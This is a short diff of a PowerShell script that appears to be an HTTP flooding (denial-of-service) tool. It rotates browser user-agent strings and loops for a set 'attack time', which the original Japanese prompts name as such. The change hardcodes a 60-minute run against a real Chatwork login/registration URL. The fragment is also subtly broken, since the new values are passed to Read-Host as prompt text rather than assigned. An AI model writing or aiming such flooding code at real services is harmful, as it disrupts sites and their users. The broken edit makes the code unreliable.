@@ -433,8 +433,8 @@ $UAs = "@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .
 @Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
 @Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
 "
-$timemin = (Read-Host 半角で攻撃時間[分]を入力してください。)
-$url = (Read-Host 半角でurlをhttp/httpsから入力してください。)
+$timemin = (Read-Host 60)
+$url = (Read-Host https://www.chatwork.com/service/packages/chatwork/pre_register.php?plan=free&lang=ja&page=login&_gl=1*1it8esd*_gcl_au*MTk0Mzg5NDY5Ny4xNzUyODA4MzgxLjcyNzcyMjc0My4xNzUzMzIxNDA1LjE3NTMzMjE0MDQ.*_ga*MTY4OTIyNjExOS4xNzQ0ODI0MDMx*_ga_XR1CWB8ZCV*czE3NTUyNDY2NjEkbzIyMiRnMCR0MTc1NTI0NjY2MyRqNTgkbDAkaDIwMzI0MDM3NjY.)
 $limit =(Get-date).AddMinutes("$timemin")
 $UA = $UAs.Split('@')
 while ( (Get-Date) -le $limit ) {
